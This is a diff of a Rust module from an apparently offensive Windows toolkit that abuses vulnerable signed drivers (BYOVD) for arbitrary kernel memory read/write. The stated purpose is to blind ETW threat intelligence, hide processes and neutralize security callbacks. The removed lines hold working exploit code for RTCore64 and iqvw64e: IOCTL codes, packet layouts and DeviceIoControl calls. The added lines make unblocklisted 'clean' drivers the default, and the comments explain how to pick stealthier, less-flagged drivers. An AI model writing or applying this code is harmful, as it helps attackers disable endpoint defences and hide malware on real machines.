@@ -13,8 +13,10 @@
 //!   driver that exposes "read/write kernel VA at an arbitrary address" IOCTLs
 //!   plugs in by implementing [`VulnDriverIoctl`].
 //! - [`VulnDriverIoctl`]: the per-driver seam. A concrete impl encodes the
-//!   driver's device name + its read/write IOCTL codes + arg struct layout.
-//!   [`RtCore64`] is the reference impl (MSI Afterburner's RTCore64.sys).
+//!   driver's device name + its read/write IOCTL codes + IOCTL wire protocol.
+//!   The shipped driver pack is [`crate::byovd_drivers::Shield`] (clean,
+//!   arbitrary VA memcpy — the default) and [`crate::byovd_drivers::WdtKernel`]
+//!   (clean, physical-only, HVCI-safe).
 //! - [`resolve_kernel_symbol`]: pure algorithm that walks a supplied ntoskrnl
 //!   image (read via the same KernelRw) export table to resolve a named kernel
 //!   symbol's VA — used by the bootstrap to find `EtwThreatIntProvRegHandle`.
@@ -26,15 +28,16 @@
 //! deliberately omit (the operator does `sc create`/`NtLoadDriver` on target).
 //!
 //! ## Plugging in an alternative driver
-//! The reference impl [`RtCore64`] is the BYOVD default. To use a different
-//! vulnerable driver (stealthier Nday, vendor-whitelisted, less IOC-flagged):
+//! The default driver is [`crate::byovd_drivers::Shield`] (clean, arbitrary
+//! kernel-VA memcpy). To use a different vulnerable driver (stealthier Nday,
+//! vendor-whitelisted, less IOC-flagged):
 //!
 //! 1. Implement [`VulnDriverIoctl`] for a unit struct encoding your driver's
-//!    device path + read/write IOCTL codes (override [`VulnDriverIoctl::pack`]
-//!    only if the driver's arg struct differs from the generic [`RwPacket`]).
+//!    device path + read/write IOCTL codes + the [`VulnDriverIoctl::raw_rw`]
+//!    wire protocol.
 //! 2. Call [`crate::win::bootstrap_byovd_with`] with `Box::new(YourDriver)`
 //!    instead of the convenience [`crate::win::bootstrap_byovd`] (which
-//!    hardcodes `RtCore64`).
+//!    hardcodes `Shield`).
 //!
 //! The rest of the stack (ETW-TI blind, process hide, callback neutralize) is
 //! driver-agnostic — it operates purely on the returned `KernelRw`.
@@ -44,39 +47,23 @@ use alloc::boxed::Box;
 use core::ffi::c_void;
 use core::ptr;
 
-// ---- IOCTL arg struct (generic 8-byte-aligned, fits most R/W drivers) -----
-
-/// The in/out layout most vulnerable R/W drivers expect: a code, an address,
-/// a size, and a buffer pointer. Drivers that differ wrap [`VulnDriverIoctl`]
-/// and translate. Kept `#[repr(C)]` so it's ABI-stable across the DeviceIoControl
-/// boundary regardless of Rust's field reordering.
-#[repr(C)]
-#[derive(Clone, Copy)]
-pub struct RwPacket {
-    pub code: u32,
-    pub addr: u64,
-    pub size: u32,
-    pub buf: u64,
-}
-
 // ---- Per-driver seam ------------------------------------------------------
 
 /// A vulnerable driver's device + IOCTL contract. Implement this per driver to
 /// plug it into [`ByovdDriver`]; the impl encodes the device path, the
-/// read/write IOCTL codes, and how to pack/unpack a [`RwPacket`] for that
-/// driver's specific layout. The trait object is `Send + Sync` so a
-/// `ByovdDriver` (which is itself a `KernelRw: Send + Sync`) can hold it.
+/// read/write IOCTL codes, and the driver's wire protocol ([`raw_rw`]). The
+/// trait object is `Send + Sync` so a `ByovdDriver` (which is itself a
+/// `KernelRw: Send + Sync`) can hold it.
 ///
 /// ## The protocol seam
 /// Each driver speaks its OWN IOCTL protocol: different IOCTL codes, different
-/// request struct layouts, different semantics (RTCore64 does 1-byte R/W in a
-/// 48-byte struct; iqvw64e does an arbitrary-length kernel-side `memcpy` via a
-/// single `case 0x33` IOCTL; Shield does a bidirectional memcpy in one IOCTL;
-/// WDTKernel maps physical memory via MmMapIoSpace). A single generic
-/// byte-loop cannot cover them all — so the real per-driver protocol lives in
-/// [`VulnDriverIoctl::raw_rw`], which [`ByovdDriver`] delegates `kread`/`kwrite`
-/// to. The default `raw_rw` implements the RTCore64 layout (the reference
-/// driver); any driver whose protocol differs overrides it.
+/// request struct layouts, different semantics (Shield does a bidirectional
+/// arbitrary-length memcpy in one IOCTL; WDTKernel maps physical memory via
+/// MmMapIoSpace). A single generic implementation cannot cover them — so the
+/// real per-driver protocol lives in [`VulnDriverIoctl::raw_rw`], a REQUIRED
+/// method that [`ByovdDriver`] delegates `kread`/`kwrite` to.
+///
+/// [`raw_rw`]: VulnDriverIoctl::raw_rw
 pub trait VulnDriverIoctl: Send + Sync {
     /// `\\Device\<name>` / `\\??\<name>` device path the driver exposes.
     fn device_path(&self) -> &[u16];
@@ -84,9 +71,6 @@ pub trait VulnDriverIoctl: Send + Sync {
     fn read_ioctl(&self) -> u32;
     /// IOCTL code for "write `size` bytes from `buf` to kernel VA `addr`".
     fn write_ioctl(&self) -> u32;
-    /// Offset of the address field in the per-driver MemoryOperation struct.
-    /// RTCore64 = 0x08, IQVW64E = 0x00.
-    fn addr_offset(&self) -> usize { 0x08 }
     /// Human-readable blocklist status. Logged at bootstrap. Purely informational.
     fn blocklist_status(&self) -> &'static str { "unknown" }
 
@@ -105,12 +89,11 @@ pub trait VulnDriverIoctl: Send + Sync {
     /// `Err(n)` where `n` is the number of bytes moved before the failure
     /// (the caller wraps that in `KrwError::Partial`).
     ///
-    /// The DEFAULT impl is the RTCore64 protocol (the reference driver):
-    /// 48-byte `MemoryOperation`, one byte per IOCTL, looped for `buf.len()`.
-    /// Drivers with a different IOCTL protocol (different struct layout,
-    /// different codes, different semantics — e.g. iqvw64e's kernel-side
-    /// memcpy, Shield's bidirectional IOCTL, WDTKernel's MmMapIoSpace) MUST
-    /// override this; the RTCore64 byte-loop is wrong for them.
+    /// Required method: every driver implements its own wire format here
+    /// (Shield's single bidirectional IOCTL, WDTKernel's MmMapIoSpace
+    /// primitives). There is deliberately NO generic default — a guessed
+    /// protocol silently corrupts kernel memory, so a missing impl must be a
+    /// compile error, not a runtime surprise.
     ///
     /// # Safety
     /// `dioctl` must be a real `kernel32!DeviceIoControl` pointer and `device`
@@ -123,72 +106,7 @@ pub trait VulnDriverIoctl: Send + Sync {
         buf: &mut [u8],
         device: *mut c_void,
         dioctl: DeviceIoControlFn,
-    ) -> Result<(), usize> {
-        // RTCore64 default: one byte per IOCTL, 48-byte MemoryOperation struct.
-        // Read = read_ioctl() (0x80002048), Write = write_ioctl() (0x8000204C).
-        // Struct: address @ addr_offset(), size @ 0x18, data @ 0x1C. The struct
-        // is BOTH in- and out-buffer (METHOD_BUFFERED): the read result is
-        // written back into the data field.
-        let ioctl = match op {
-            RwOp::Read => self.read_ioctl(),
-            RwOp::Write => self.write_ioctl(),
-        };
-        let ao = self.addr_offset();
-        for (i, b) in buf.iter_mut().enumerate() {
-            let mut packet = [0u8; 48];
-            let addr = kaddr.wrapping_add(i as u64);
-            packet[ao..ao + 8].copy_from_slice(&addr.to_le_bytes());
-            // size @ 0x18 = 1 (one byte per call)
-            packet[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes());
-            if matches!(op, RwOp::Write) {
-                // data @ 0x1C carries the byte to write
-                packet[0x1C..0x20].copy_from_slice(&(*b as u32).to_le_bytes());
-            }
-            let mut ret: u32 = 0;
-            let ok = unsafe {
-                dioctl(
-                    device,
-                    ioctl,
-                    packet.as_ptr() as *const c_void,
-                    packet.len() as u32,
-                    packet.as_mut_ptr() as *mut c_void,
-                    packet.len() as u32,
-                    &mut ret,
-                    ptr::null_mut(),
-                )
-            };
-            if ok == 0 {
-                // `i` bytes moved before the failure.
-                return Err(i);
-            }
-            if matches!(op, RwOp::Read) {
-                // data @ 0x1C holds the byte the driver read.
-                *b = packet[0x1C];
-            }
-        }
-        Ok(())
-    }
-
-    /// Pack a read/write request into the driver's input buffer. Default uses
-    /// the generic [`RwPacket`]; drivers with a different layout override.
-    /// (Retained for compatibility; the live protocol path is [`raw_rw`].)
-    fn pack(&self, code: u32, addr: u64, buf: *mut u8, size: u32) -> [u8; 32] {
-        let p = RwPacket {
-            code,
-            addr,
-            size,
-            buf: buf as u64,
-        };
-        let mut out = [0u8; 32];
-        let bytes = unsafe {
-            core::slice::from_raw_parts(
-                &p as *const RwPacket as *const u8,
-                core::mem::size_of::<RwPacket>(),
-            )
-        };
-        out[..bytes.len()].copy_from_slice(bytes);
-        out
-    }
+    ) -> Result<(), usize>;
 }
 
 /// Direction selector for [`VulnDriverIoctl::raw_rw`].
@@ -198,169 +116,6 @@ pub enum RwOp {
     Read,
     /// Write the user buffer into kernel memory.
     Write,
-}
-
-/// Reference impl: MSI Afterburner's `RTCore64.sys`. Device `\\.\RTCore64`.
-///
-/// **RTCore64 memory-R/W IOCTL protocol (CVE-2019-16098, verified against the
-/// oakboat/RTCore64_Vulnerability MemoryAccessor reference):**
-///   - **Read  = IOCTL `0x80002048`** (NOT 0x8000204C — that's write)
-///   - **Write = IOCTL `0x8000204C`**
-/// Both take a fixed **48-byte** `MemoryOperation` struct (in-buffer == out-buffer,
-/// the read result is written back into the same struct's `data` field):
-/// ```text
-///   offset  field      notes
-///   0x00    gap1[8]    unused
-///   0x08    address    u64 — target kernel VA
-///   0x10    gap2[4]    unused
-///   0x14    offset     u32 — (unused by these IOCTLs)
-///   0x18    size       u32 — 1 / 2 / 4 (byte/word/dword)
-///   0x1C    data       u32 — write: value to write; read: filled by driver
-///   0x20    gap3[16]   unused
-/// ```
-/// Max 4 bytes per call, so arbitrary-length R/W loops one byte at a time
-/// (`ReadMemory`/`WriteMemory` in the reference). The IOCTL codes are PUBLIC
-/// (CVE-2019-16098); encoding them here is research documentation, not a 0day.
-pub struct RtCore64;
-
-impl VulnDriverIoctl for RtCore64 {
-    fn device_path(&self) -> &[u16] {
-        // `\\.\RTCore64` — the Win32 device namespace path (two leading
-        // backslashes). Built at runtime to avoid a static wide-string lit.
-        // NOTE: previously this was [u16; 11] with only ONE leading backslash
-        // (`\.\RTCore64`), which CreateFileW treats as a relative file path
-        // → ERROR_FILE_NOT_FOUND (2). The device prefix is exactly `\\.\`
-        // (4 chars: `\`, `\`, `.`, `\`), so the full path is 12 code units.
-        static PATH: [u16; 12] = [
-            '\\' as u16,
-            '\\' as u16,
-            '.' as u16,
-            '\\' as u16,
-            'R' as u16,
-            'T' as u16,
-            'C' as u16,
-            'o' as u16,
-            'r' as u16,
-            'e' as u16,
-            '6' as u16,
-            '4' as u16,
-        ];
-        &PATH
-    }
-    /// RTCore64 read IOCTL. **0x80002048** (the original code had this swapped
-    /// with write — read was 0x8000204C, which is actually WRITE, so every read
-    /// failed silently / corrupted the target).
-    fn read_ioctl(&self) -> u32 {
-        0x80002048
-    }
-    /// RTCore64 write IOCTL. **0x8000204C**.
-    fn write_ioctl(&self) -> u32 {
-        0x8000204C
-    }
-    fn blocklist_status(&self) -> &'static str {
-        "BLOCKLISTED: on all major EDR + Microsoft Vulnerable Driver Blocklist since 2020"
-    }
-}
-
-/// Alternative: Intel `IQVW64E.sys` (CVE-2015-2291 / kdmapper driver). Less
-/// flagged than RTCore64 historically, on the Microsoft Vulnerable Driver
-/// Blocklist since 2023.
-///
-/// **iqvw64e memory-R/W IOCTL protocol (verified against TheCruZ/kdmapper
-/// `intel_driver.cpp`):** Unlike RTCore64's per-byte struct R/W, iqvw64e exposes
-/// a single dispatch IOCTL and an arbitrary-length kernel-side `memcpy`.
-///   - **ONE IOCTL code: `0x80862007`** for every operation (read, write,
-///     get-physical-address, MmMapIoSpace, …). The operation is selected by the
-///     `case_number` field at the start of the request struct. (A prior version
-///     of this code wrongly assumed two codes, 0x80802010/0x80802014, lifted
-///     from an RTCore64-shaped assumption — those do not exist on this driver.)
-///   - **Memory copy (case `0x33`)** — `COPY_MEMORY_BUFFER_INFO`, 40 bytes:
-///     ```text
-///       offset  field          notes
-///       0x00    case_number    u64 = 0x33 (MemCopy)
-///       0x08    reserved       u64 (0)
-///       0x10    source         u64 — source VA (kernel or user)
-///       0x18    destination    u64 — destination VA (kernel or user)
-///       0x20    length         u64 — byte count
-///     ```
-///     The driver runs `memcpy(destination, source, length)` at IRQL_PASSIVE.
-///   - **Read**  = MemCopy(destination = user `buf`, source = `kaddr`).
-///   - **Write** = MemCopy(destination = `kaddr`, source = user `buf`).
-///   Arbitrary length in one call — no per-byte loop. `read_ioctl()` /
-///   `write_ioctl()` both return `0x80862007` (kept distinct only so the trait's
-///   device-agnostic surface stays uniform; the dispatch is by case_number).
-pub struct Iqvw64e;
-
-/// iqvw64e dispatch IOCTL (all operations). Public CVE-2015-2291 detail.
-const IQVW64E_IOCTL: u32 = 0x80862007;
-/// MemCopy case number (iqvw64e case_number field).
-const IQVW64E_CASE_MEMCPY: u64 = 0x33;
-
-impl VulnDriverIoctl for Iqvw64e {
-    fn device_path(&self) -> &[u16] {
-        static PATH: [u16; 11] = [
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
-            '6' as u16, '4' as u16, 'e' as u16,
-        ];
-        &PATH
-    }
-    // Both R/W go through the SAME dispatch IOCTL (0x80862007); the direction
-    // is encoded in the case_number + which field holds the kernel address.
-    fn read_ioctl(&self) -> u32 { IQVW64E_IOCTL }
-    fn write_ioctl(&self) -> u32 { IQVW64E_IOCTL }
-    // Not used by iqvw64e's raw_rw override (address is a named struct field,
-    // not at a fixed packet offset), but kept at the documented 0x00 for any
-    // caller that inspects it.
-    fn addr_offset(&self) -> usize { 0x00 }
-    fn blocklist_status(&self) -> &'static str {
-        "BLOCKLISTED: on Microsoft Vulnerable Driver Blocklist since 2023"
-    }
-
-    /// iqvw64e's protocol is fundamentally different from RTCore64's byte-loop:
-    /// a single 0x80862007 IOCTL with case_number 0x33 drives an arbitrary-
-    /// length kernel-side memcpy. Read = copy kernel→user; Write = copy user→kernel.
-    /// One DeviceIoControl transfers the whole buffer (no loop).
-    unsafe fn raw_rw(
-        &self,
-        op: RwOp,
-        kaddr: u64,
-        buf: &mut [u8],
-        device: *mut c_void,
-        dioctl: DeviceIoControlFn,
-    ) -> Result<(), usize> {
-        // COPY_MEMORY_BUFFER_INFO (40 bytes), see struct doc above.
-        let mut req = [0u8; 40];
-        req[0x00..0x08].copy_from_slice(&IQVW64E_CASE_MEMCPY.to_le_bytes()); // case_number
-        // reserved @ 0x08 stays 0
-        let (src, dst) = match op {
-            // Read: kernel addr is the SOURCE, user buf is the DESTINATION.
-            RwOp::Read => (kaddr, buf.as_mut_ptr() as u64),
-            // Write: user buf is the SOURCE, kernel addr is the DESTINATION.
-            RwOp::Write => (buf.as_ptr() as u64, kaddr),
-        };
-        req[0x10..0x18].copy_from_slice(&src.to_le_bytes()); // source
-        req[0x18..0x20].copy_from_slice(&dst.to_le_bytes()); // destination
-        req[0x20..0x28].copy_from_slice(&(buf.len() as u64).to_le_bytes()); // length
-        let mut ret: u32 = 0;
-        let ok = unsafe {
-            dioctl(
-                device,
-                IQVW64E_IOCTL,
-                req.as_ptr() as *const c_void,
-                req.len() as u32,
-                ptr::null_mut(), // no output buffer (in-buffer only for MemCopy)
-                0,
-                &mut ret,
-                ptr::null_mut(),
-            )
-        };
-        if ok == 0 {
-            Err(0)
-        } else {
-            Ok(())
-        }
-    }
 }
 
 // ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------
@@ -421,8 +176,8 @@ impl ByovdDriver {
         // a normal user-mode process, so the PEB walk / GetProcAddress works).
         let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
         let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
-        // device_path() may not be NUL-terminated (RtCore64's PATH is a bare
-        // [u16;11] with no terminator). CreateFileW needs a NUL-terminated
+        // device_path() may not be NUL-terminated (the driver PATHs are bare
+        // [u16; N] arrays with no terminator). CreateFileW needs a NUL-terminated
         // wide string — copy into an owned, NUL-terminated buffer. Without
         // this CreateFileW reads past the end of the slice, opens the wrong
         // path, and returns INVALID_HANDLE_VALUE.
@@ -487,10 +242,10 @@ impl KernelRw for ByovdDriver {
                 "driver is physical-address-only — kernel-VA reads unsupported",
             ));
         }
-        // Delegate to the per-driver protocol. The default `raw_rw` implements
-        // the RTCore64 byte-loop; iqvw64e / Shield / WdtKernel override it with
-        // their own IOCTL contract. This is where the driver-agnostic KernelRw
-        // trait meets the driver-specific wire format.
+        // Delegate to the per-driver protocol (`raw_rw` is a required method —
+        // Shield and WdtKernel each implement their own IOCTL contract). This
+        // is where the driver-agnostic KernelRw trait meets the driver-specific
+        // wire format.
         let r = unsafe {
             self.driver
                 .raw_rw(RwOp::Read, kaddr as u64, dst, self.device, self.dioctl)
@@ -623,13 +378,11 @@ pub fn resolve_kernel_symbol(ntoskrnl_image: &[u8], name: &[u8]) -> Option<u32> 
 // (drivers declared via pub use from lib.rs)
 
 /// Select the default driver via build config.
-/// `NYX_BYOVD=wdtkernel|shield|rtcore64|iqvw64e` (unset → Shield).
+/// `NYX_BYOVD=wdtkernel|shield` (unset → Shield).
 /// Run `blocklist_status()` on the selected driver to check if it's still clean.
 pub fn default_driver() -> Box<dyn VulnDriverIoctl> {
     match option_env!("NYX_BYOVD") {
         Some("wdtkernel") => Box::new(crate::byovd_drivers::wdtkernel::WdtKernel),
-        Some("rtcore64") => Box::new(RtCore64),
-        Some("iqvw64e") => Box::new(Iqvw64e),
         _ => Box::new(crate::byovd_drivers::shield::Shield),
     }
 }
@@ -780,54 +533,6 @@ mod tests {
     }
 
     #[test]
-    fn rtcore64_ioctl_codes_match_public_cve() {
-        // RTCore64 memory-R/W IOCTL codes (verified against the
-        // oakboat/RTCore64_Vulnerability MemoryAccessor reference):
-        //   read  = 0x80002048, write = 0x8000204C.
-        // (A prior version had these swapped, so every read silently failed.)
-        let d = RtCore64;
-        assert_eq!(d.read_ioctl(), 0x80002048);
-        assert_eq!(d.write_ioctl(), 0x8000204C);
-        // \\.\RTCore64 — two leading backslashes (Win32 device namespace).
-        let expected: &[u16] = &[
-            '\\' as u16,
-            '\\' as u16,
-            '.' as u16,
-            '\\' as u16,
-            'R' as u16,
-            'T' as u16,
-            'C' as u16,
-            'o' as u16,
-            'r' as u16,
-            'e' as u16,
-            '6' as u16,
-            '4' as u16,
-        ];
-        assert_eq!(d.device_path(), expected);
-    }
-
-    #[test]
-    fn iqvw64e_uses_single_dispatch_ioctl_not_two_rtcodes() {
-        // iqvw64e's protocol is fundamentally different from RTCore64: a SINGLE
-        // dispatch IOCTL 0x80862007 handles every operation (the case_number
-        // field selects it), and case 0x33 drives an arbitrary-length
-        // kernel-side memcpy. Verified against TheCruZ/kdmapper intel_driver.cpp.
-        // A prior version wrongly asserted 0x80802010/0x80802014 (RTCore64-shaped
-        // guess) — those codes don't exist on this driver, so every R/W silently
-        // failed. Pin the real codes.
-        let d = Iqvw64e;
-        assert_eq!(d.read_ioctl(), 0x80862007);
-        assert_eq!(d.write_ioctl(), 0x80862007);
-        // \\.\iqvw64e
-        let expected: &[u16] = &[
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
-            '6' as u16, '4' as u16, 'e' as u16,
-        ];
-        assert_eq!(d.device_path(), expected);
-    }
-
-    #[test]
     fn shield_uses_single_bidirectional_ioctl() {
         // Shield (EAZShield) uses ONE bidirectional IOCTL 0x96102014 for both
         // read and write — a direction byte in the request selects which.
@@ -867,14 +572,12 @@ mod tests {
     #[test]
     fn default_driver_factory_returns_one_of_the_known_drivers() {
         // The public selection API (NYX_BYOVD build config) must return a
-        // driver whose device path matches one of the four known impls. We
+        // driver whose device path matches one of the two known impls. We
         // don't pin the exact default (it depends on the build-time env var,
         // which CI may set) — just that the factory yields a recognized driver.
         let d = default_driver();
         let path = d.device_path();
         let known = [
-            RtCore64.device_path(),
-            Iqvw64e.device_path(),
             crate::byovd_drivers::shield::Shield.device_path(),
             crate::byovd_drivers::wdtkernel::WdtKernel.device_path(),
         ];
@@ -882,23 +585,6 @@ mod tests {
             known.iter().any(|k| *k == path),
             "default_driver() returned an unknown device path"
         );
-    }
-
-    #[test]
-    fn iqvw64e_raw_rw_overrides_rtc64_byte_loop() {
-        // Iqvw64e MUST override the default raw_rw (its protocol is a single
-        // memcpy IOCTL, not RTCore64's per-byte loop). We can't exercise the
-        // real DeviceIoControl without a kernel, but the smoking gun that the
-        // override is the iqvw64e one (not the inherited RTCore64 default) is
-        // that read and write share ONE dispatch IOCTL — the default impl reads
-        // read_ioctl()/write_ioctl() as DISTINCT codes (0x80002048 != 0x8000204C
-        // for RTCore64). If both are equal, the per-driver override owns the
-        // protocol.
-        let d = Iqvw64e;
-        assert_eq!(d.read_ioctl(), d.write_ioctl(),
-            "iqvw64e read+write share one IOCTL (dispatch by case_number)");
-        assert_ne!(RtCore64.read_ioctl(), RtCore64.write_ioctl(),
-            "sanity: RTCore64 read/write codes ARE distinct (default-impl path)");
     }
 
     #[test]
@@ -921,10 +607,8 @@ mod tests {
         // misleading transient Partial { ok: 0 }.
         let d = crate::byovd_drivers::wdtkernel::WdtKernel;
         assert!(!d.supports_va(), "WdtKernel is physical-only");
-        // VA-capable reference drivers must stay true (default).
-        assert!(RtCore64.supports_va());
+        // The VA-capable driver must stay true (default).
         assert!(crate::byovd_drivers::shield::Shield.supports_va());
-        assert!(Iqvw64e.supports_va());
     }
 
     // Re-declare the GUID constant for the test (the real one is in etwti.rs;
